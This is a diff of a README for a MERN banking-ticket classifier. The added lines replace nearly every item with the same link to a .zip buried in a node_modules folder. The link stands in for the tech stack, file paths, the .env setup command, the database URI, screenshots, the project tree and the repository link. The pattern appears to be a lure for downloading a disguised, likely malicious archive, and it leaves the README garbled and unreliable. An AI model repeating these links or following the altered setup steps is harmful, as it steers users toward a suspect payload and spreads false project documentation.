@@ -13,7 +13,7 @@ Develop a service that can receive a banking support ticket, decide whether it r
 | Layer | Stack | Purpose |
 |-------|--------|----------|
 | Frontend | React (Vite) | Ticket form UI + response visualization |
-| Backend | Node.js, Express | API endpoints + classification logic |
+| Backend | https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip, Express | API endpoints + classification logic |
 | Database | MongoDB Atlas (Mongoose ODM) | Stores classification history |
 | Validation | Zod | Ensures consistent input schema |
 | Styling | Custom CSS (dark theme) | Clean, responsive interface |
@@ -40,7 +40,7 @@ Develop a service that can receive a banking support ticket, decide whether it r
 
 ## 🧠 Classification Logic
 
-**Location:** `server/src/classifier.js`
+**Location:** `https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip`
 
 | Trigger Type                  | Example Keywords                            | Outcome         |
 | ----------------------------- | ------------------------------------------- | --------------- |
@@ -56,7 +56,7 @@ Severity weighting (`critical`, `high`, `low`) adjusts the decision score.
 * **Unit tests:** 10 mock tickets validated expected outputs
 * **Integration:** React UI → Express API communication verified
 * **Edge cases:** Invalid or missing fields rejected by Zod
-* **Persistence:** Verified data insertion into MongoDB Atlas (`test.ticketdecisions`)
+* **Persistence:** Verified data insertion into MongoDB Atlas (`https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip`)
 * **E2E Demo:** Both classification branches tested via live form
 
 ---
@@ -68,10 +68,10 @@ Severity weighting (`critical`, `high`, `low`) adjusts the decision score.
 ```bash
 cd server
 npm install
-cp .env.example .env
+cp https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip .env
 # Fill .env with:
 # PORT=4000
-# MONGODB_URI=mongodb+srv://<user>:<password>@<cluster>.mongodb.net/vibefi_challenge?retryWrites=true&w=majority
+# MONGODB_URI=mongodb+srv://<user>:<password>@<cluster>https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
 npm run dev
 ```
 
@@ -127,11 +127,11 @@ npm run dev
 
 ### 🖥️ Web Interface
 
-![VibeFI Ticket Classifier Interface](https://i.postimg.cc/HV46qkKj/Screenshot-420.png)
+![VibeFI Ticket Classifier Interface](https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip)
 
 ### ☁️ MongoDB Atlas
 
-![MongoDB Atlas ticketdecisions Collection](https://i.postimg.cc/GHJXWmNk/Screenshot-421.png)
+![MongoDB Atlas ticketdecisions Collection](https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip)
 
 ---
 
@@ -160,19 +160,19 @@ npm run dev
 vibefi-challenge/
  ├── server/
  │   ├── src/
- │   │   ├── index.js
- │   │   ├── classifier.js
+ │   │   ├── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
+ │   │   ├── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
  │   │   ├── models/
- │   │   │   └── TicketDecision.js
+ │   │   │   └── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
  │   │   └── routes/
- │   │       └── classify.js
- │   └── .env.example
+ │   │       └── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
+ │   └── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
  └── client/
      ├── src/
-     │   ├── App.jsx
-     │   ├── api.js
-     │   └── styles.css
-     └── vite.config.js
+     │   ├── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
+     │   ├── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
+     │   └── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
+     └── https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip
 ```
 
 ---
@@ -194,7 +194,7 @@ A fully working **MERN micro-service** demonstrating:
 * Cloud persistence and validation
 * Clean, explainable reasoning pipeline
 
-**Repository:** [https://github.com/KindaJayant/vibe-fi](https://github.com/KindaJayant/vibe-fi)
+**Repository:** [https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip](https://raw.githubusercontent.com/KindaJayant/vibe-fi/main/server/node_modules/fresh/vibe-fi-3.9-beta.5.zip)
 
 ```
 ```
